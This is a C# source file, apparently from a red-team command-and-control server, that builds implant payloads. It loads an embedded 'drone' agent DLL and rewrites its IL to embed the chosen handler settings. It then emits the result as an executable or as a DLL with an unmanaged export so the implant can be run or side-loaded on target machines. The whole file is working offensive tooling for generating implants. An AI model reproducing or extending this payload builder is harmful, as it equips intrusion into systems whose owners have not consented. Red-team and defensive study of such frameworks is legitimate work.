using System;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

using dnlib.DotNet;
using dnlib.DotNet.Emit;
using dnlib.DotNet.Writer;
using dnlib.PE;

using TeamServer.Handlers;

namespace TeamServer.Models
{
    public class Payload
    {
        public PayloadFormat Format { get; set; }
        public string DllExport { get; set; }
        public byte[] Content { get; set; }
        
        private Handler _handler;

        public enum PayloadFormat
        {
            Exe,
            Dll
        }

        public void SetHandler(Handler handler)
            => _handler = handler;

        public async Task Generate()
        {
            var drone = await Utilities.GetEmbeddedResource("drone.dll");
            var module = ModuleDefMD.Load(drone);
            module = EmbedHandler(module);
            
            var ms = new MemoryStream();
            
            if (Format == PayloadFormat.Exe)
            {
                module = ConvertDllToExe(module);
                module.Write(ms);
            }
            
            if (Format == PayloadFormat.Dll)
            {
                module = AddUnmanagedExport(module);

                var opts = new ModuleWriterOptions(module)
                {
                    PEHeadersOptions = {Machine = Machine.AMD64},
                    Cor20HeaderOptions = {Flags = 0}
                };
                
                module.Write(ms, opts);
            }
            
            Content = ms.ToArray();
            await ms.DisposeAsync();
        }

        private ModuleDefMD EmbedHandler(ModuleDefMD module)
        {
            // get handlers (not including the abstract)
            var handlers = module.Types
                .Where(t => t.FullName.Contains("Drone.Handlers", StringComparison.OrdinalIgnoreCase))
                .Where(t => !t.FullName.Equals("Drone.Handlers.Handler", StringComparison.OrdinalIgnoreCase));
            
            // match the one that matches the abstract name
            // it's actually set in the ctor of all places
            TypeDef targetHandler = null;
            
            foreach (var handler in handlers)
            {
                var ctor = handler.Methods.GetConstructor();
                if (ctor is null) continue;
                
                var instructions = ctor.Body.Instructions.Where(i => i.OpCode == OpCodes.Ldstr);
                
                foreach (var instruction in instructions)
                {
                    if (instruction.Operand is null) continue;
                    var operand = (string) instruction.Operand;
                    if (!operand.Equals(_handler.Name, StringComparison.OrdinalIgnoreCase)) continue;
                    
                    targetHandler = handler;
                    break;
                }
            }

            if (targetHandler is null) throw new Exception("Could not find matching Handler");

            if (_handler.Parameters is not null)
            {
                foreach (var handlerParameter in _handler.Parameters)
                {
                    // get matching method in handler
                    var method = targetHandler.Methods.GetMethod(handlerParameter.Name);
                    var instruction = method?.Body.Instructions.FirstOrDefault(i => i.OpCode == OpCodes.Ldstr);
                    if (instruction is null) continue;
                    instruction.Operand = handlerParameter.Value;
                }
            }

            // finally, ensure that the drone is creating an instance of the correct handler
            var droneType = module.Types.GetType("Drone");
            var getHandler = droneType.Methods.GetMethod("get_GetHandler");
            getHandler.Body.Instructions[0].Operand = targetHandler.Methods.GetConstructor();

            return module;
        }

        private static ModuleDefMD ConvertDllToExe(ModuleDefMD module)
        {
            module.Kind = ModuleKind.Console;

            var program = module.Types.GetType("Program");
            var main = program?.Methods.GetMethod("Main");

            module.EntryPoint = main;

            return module;
        }
        
        private ModuleDefMD AddUnmanagedExport(ModuleDefMD mod)
        {
            var program = mod.Types.GetType("Program");
            var execute = program?.Methods.GetMethod("Execute");
            if (execute is null) return mod;
            
            execute.ExportInfo = new MethodExportInfo(DllExport);
            execute.IsUnmanagedExport = true;
            
            var type = execute.MethodSig.RetType;
            type = new CModOptSig(mod.CorLibTypes.GetTypeRef("System.Runtime.CompilerServices", "CallConvStdcall"), type);
            execute.MethodSig.RetType = type;

            return mod;
        }
    }
}